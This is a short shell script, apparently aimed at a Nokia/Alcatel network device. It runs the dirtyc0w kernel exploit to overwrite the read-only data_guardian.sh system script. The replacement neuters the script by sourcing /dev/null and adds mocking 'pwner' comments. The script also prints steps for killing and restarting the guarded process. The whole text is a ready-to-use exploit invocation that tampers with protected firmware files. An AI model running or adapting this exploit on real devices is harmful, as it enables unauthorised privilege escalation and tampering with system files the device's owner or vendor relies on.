#!/bin/sh
#determine architecture type and set location of script
cat /proc/cpuinfo | grep ARMv7 > /dev/null
cpu_is_arm="$?"
if [ "$cpu_is_arm" -eq 0 ]; then
    guardian_script="/bcm/script/data_guardian.sh"
else
    guardian_script="/usr/exe/data_guardian.sh"
fi
guardianpid="$(ps | grep -m1 "$guardian_script" | grep -oE -m1 "[0-9]{4,6}" | head -n 1)"
green='\033[0;32m'
clear='\033[0m'
echo "dirtyc0w requires you to manually kill the process wkth Ctrl+C after overwrite"
echo "so in order to get the updated configuration running, do that, then run:"
printf "${green}\n"
echo "kill $guardianpid && sh $guardian_script &"
printf "${clear}\n"
echo "Overwriting read-only data guardian script..."
/configs/bin/dirtyc0w  $guardian_script '# File name: data_guardian.sh
# Description: This script used for backup files periodically, refer to backup_files.sh for details.
# Author: xinpeng.cao@alcatel-sbell.com.cn
# History: 2016/4/25 Create file.

#! /bin/sh

source /dev/null

# backup files one time before sleep since logs damaged and power down when sleep,
# and configs also damaged when power up ALU02591096
#backup_static_files;
#sync
#
#we've already done everything we needed to by changing the source line
#for the script commands so the rest of this can just be anything, really.
#
#timmy turner, my name is doug dimmapwn, pwner of the nokia dimmadome
#doug dimmapwn? pwner of the nokia dimmadome?
#that's right, doug dimmapwn
#
#communism will win
'
